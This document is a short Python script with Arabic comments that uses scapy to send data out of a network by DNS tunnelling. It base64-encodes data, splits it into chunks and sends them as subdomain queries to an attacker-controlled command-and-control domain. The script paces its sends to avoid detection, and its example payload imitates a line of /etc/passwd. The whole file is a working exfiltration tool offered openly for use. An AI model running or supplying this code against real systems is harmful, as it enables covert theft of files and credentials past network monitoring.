
from scapy.all import IP, UDP, DNS, DNSQR, send, sr1
import base64
import time

# إعدادات المهاجم
TARGET_DNS_SERVER = "172.18.0.1"  # السيرفر المستهدف (الذي سيمرر الطلبات)
ATTACKER_DOMAIN = "c2-server.com" # النطاق الذي تملكه وتراقب سجلاته

def prepare_data(data):
    """تشفير البيانات وتحويلها لتناسب هيكل النطاقات الفرعية"""
    b64_data = base64.b64encode(data.encode()).decode().replace('=', 'x')
    return b64_data

def execute_tunneling(data_to_send):
    """تقسيم البيانات وإرسالها عبر طلبات DNS"""
    chunks = [data_to_send[i:i+60] for i in range(0, len(data_to_send), 60)]
    
    for chunk in chunks:
        # بناء نطاق فرعي يحمل الجزء المشفر من البيانات
        query = f"{chunk}.{ATTACKER_DOMAIN}"
        
        # إنشاء حزمة DNS
        packet = IP(dst=TARGET_DNS_SERVER) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query))
        
        print(f"[*] Exfiltrating chunk: {query}")
        
        # إرسال الحزمة
        try:
            send(packet, verbose=0)
            time.sleep(0.5) # تجنب اكتشاف الهجوم عبر التكرار السريع
        except Exception as e:
            print(f"[!] Error sending packet: {e}")

if __name__ == "__main__":
    # مثال: سرقة محتوى ملف /etc/passwd (نظرياً)
    data = "ROOT:x:0:0:root:/root:/bin/bash" 
    print("[*] Starting Data Exfiltration via DNS Tunnel...")
    execute_tunneling(prepare_data(data))
    print("[+] Operation completed.")
